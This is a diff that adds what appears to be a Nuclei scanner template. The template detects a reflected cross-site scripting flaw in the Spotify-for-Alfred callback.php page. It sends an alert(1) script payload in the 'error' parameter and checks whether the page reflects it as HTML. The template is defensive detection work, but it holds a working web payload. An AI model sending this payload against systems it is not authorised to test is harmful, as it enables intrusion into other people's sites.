@@ -1,0 +1,30 @@
+id: xss-spotifyforalfred
+
+info:
+  name: xss-spotifyforalfred
+  author: osamahamad
+  severity: medium
+  description: Cross-site scripting (XSS) on https://github.com/citelao/Spotify-for-Alfred/issues/137
+  tags: xss,discourse
+
+requests:
+  - method: GET
+    path:
+      - '{{BaseURL}}/callback.php?error=%22%2F%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E'
+      - '{{BaseURL}}/Spotify-for-Alfred/callback.php?error=%22%2F%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E'
+    
+    
+    redirects: true
+    max-redirects: 1
+    matchers-condition: and
+    matchers:
+
+      - type: word
+        words:
+          - '"/><script>alert(1)</script>'
+        part: body
+
+      - type: word
+        words:
+          - "text/html"
+        part: header
